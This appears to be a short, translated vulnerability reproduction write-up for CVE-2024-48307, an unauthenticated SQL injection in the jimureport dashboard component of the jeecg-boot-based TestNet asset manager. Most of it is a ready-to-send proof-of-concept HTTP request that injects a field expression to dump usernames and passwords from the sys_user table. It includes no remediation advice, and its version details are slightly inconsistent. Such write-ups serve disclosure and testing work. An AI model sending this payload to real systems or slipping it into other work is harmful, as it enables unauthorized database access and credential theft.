## 0x01 Introduction
TestNet Asset Management system is designed to provide comprehensive and efficient Internet asset management and monitoring services, and build a detailed asset information base. TestNet is based on jeecg-boot, and SQL injection vulnerability exists in CVE-2024-48307, which affects TestNet

## 0x02 Vulnerability Overview
TestNet/computer/onlDragDatasetHead/SQL injection vulnerabilities are unauthorized getTotalData interface. An attacker can use jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar without permission to query the database, resulting in database information leakage.

## 0x03 Vulnerability version
<font style="color:rgb(31, 35, 40);">jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar <= 1.8.1</font>

## 0x04 Environment Setup
Source code: [https://github.com/testnet0/testnet](https://github.com/testnet0/testnet)

## 0x05 The vulnerability reappears
jimureport-dashboard-spring-boot-starter\1.8.0-beta\jimureport-dashboard-spring-boot-starter-1.8.0-beta.jar!\org\jeecg\modules\drag\b\d.class

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1732696004228-2b7bad0c-9a7d-4e97-88f8-a8ea054a19e1.png)

poc

```plain
POST /jeecgboot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: 192.168.187.129:8099
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 311
Content-Type: application/json

{"tableName": "sys_user", "compName": "test", "condition": {"filter": {}}, "config": {"assistValue": [], "assistType": [], "name": [{"fieldName": "concat(username,0x3a,password)", "fieldType": "string"}, {"fieldName": "id", "fieldType": "string"}], "value": [{"fieldName": "id", "fieldType": "1"}], "type": []}}
```

![](https://cdn.nlark.com/yuque/0/2024/png/43117778/1732694106006-084e7a33-06de-45b6-9c01-3ff0199a66c7.png)

